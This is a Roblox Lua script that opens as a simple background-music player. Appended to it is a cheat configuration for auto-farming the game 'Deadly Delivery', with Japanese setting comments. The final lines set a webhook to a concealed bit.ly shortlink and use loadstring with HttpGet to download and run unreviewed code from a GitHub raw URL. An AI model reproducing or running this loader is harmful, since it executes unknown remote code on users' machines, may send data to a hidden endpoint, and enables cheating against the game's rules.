local SoundService = game:GetService("SoundService")

local musicIds = {
    "rbxassetid://78793729048442",
    "rbxassetid://80936272044791",
}

local lastIndex = 0

local sound = Instance.new("Sound")
sound.Volume = 0.25
sound.Looped = true
sound.Parent = SoundService

local function getRandomIndex()
    local index
    repeat
        index = math.random(#musicIds)
    until index ~= lastIndex
    lastIndex = index
    return index
end

sound.Ended:Connect(function()
    sound.SoundId = musicIds[getRandomIndex()]
    sound:Play()
end)

sound.SoundId = musicIds[getRandomIndex()]
sound:Play()

-- true = オン | false = オフ
getgenv().WebhookURL = "http://bit.ly/4ssAHs3"
getgenv().ScriptConfig = {
    SellAll = false, -- 次の実行でアイテムの取得を停止したい場合を除き、trueに設定します
    LockFoodAbove = 1000, -- 設定番号/価格より大きい/お気に入りの食品を自動的にロックします
    MinFoodPrice = 5, -- 受け取るべき最小食品を設定し、無効にするには0に設定します
    FloorLimit = 30, -- 試行する最大フロア
    LobbySize = 1,
    LobbyFriendsOnly = true,
    PickupAttempts = 5, -- 食べ物を拾うのをあきらめるまでの最大回数、推奨される最低時間は5回です
    InteractCooldown = 0.05, -- インタラクション/ピックアップ間のクールダウン、推奨最低は0.1です
    StatusMenu = true, -- ダンジョンでGUIを有効にして、よりクリーンな外観のために、Hを押して非表示にするか、右上のボタンをタップします
    HideFood = 20, -- 値設定の下にある食べ物をエレベーターに隠し、無効に0に設定します
    WaitBeforeVote = 0.5, -- 投票する前に秒/秒の（数）を待ちます
    WalkSpeed = 20, -- ダンジョンにいるときに歩行速度を変更し、一度だけ変更できます
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/SNSDARK/Scripts/refs/heads/main/Deadly%20Delivery.lua"))()
